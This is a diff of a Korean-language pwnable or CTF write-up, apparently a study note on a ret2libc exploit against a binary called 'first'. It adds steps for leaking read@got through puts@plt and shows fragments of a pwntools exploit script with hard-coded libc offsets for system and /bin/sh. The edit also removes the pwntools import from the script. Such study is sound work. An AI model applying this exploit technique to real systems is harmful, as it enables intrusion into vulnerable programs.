@@ -111,16 +111,31 @@ print("scanf@got : " + str(hex(e.got["scanf"])))
 
 ![image](https://user-images.githubusercontent.com/59410565/119926112-b44d1800-bfb1-11eb-89ab-f2025c83543f.png)
 
+
+
+### Exploit
+
+------
+
+#### Exploit 순서
+
+```
+- puts.plt에 read.got를 넣어 leak
+- elf.libc.symbols['**']로 **의 주소를 가져온다. 
+- u64(r.recvuntil("\x7f")[-6:].ljust(8, '\x00'))
+	-> u64 : 리틀 엔디안으로 패킹된 문자열을 언패킹 해서 int형으로 반환(주로 메모리 릭을 하여 얻은 주소에 사용)
+	-> ljust : leak 주소가 8byte를 모두 차지하고 있지 않으면 빈 공간을 "\x00"으로 채워주는 역할
+```
+
+
+
+#### Exploit code
+
 > elf.symbols[] : 바이너리 함수 내에서 정의된 함수의 주소
 >
 > a.plt(b.got) >> b의 주소를 a의 plt에 
 
-
-
-### Exploit code
-
 ```python
-from pwn import *
 from struct import *
  
 #context.log_level = 'debug'
@@ -129,7 +144,7 @@ e = ELF("./first")
   
 libcbase_read_offset = e.libc.symbols['read']
 print(hex(libcbase_read_offset))
-libcbase_system_offset = 0x453a0 #elf.libc.symbols['system']
+libcbase_system_offset = 0x453a0
 
 binsh_offset = 0x18ce57 
 
@@ -161,3 +176,6 @@ r.send(payload)
 r.interactive()
 ```
 
+결과
+
+![image](https://user-images.githubusercontent.com/59410565/119938225-08aec280-bfc7-11eb-9a1a-b44f26e37d32.png)
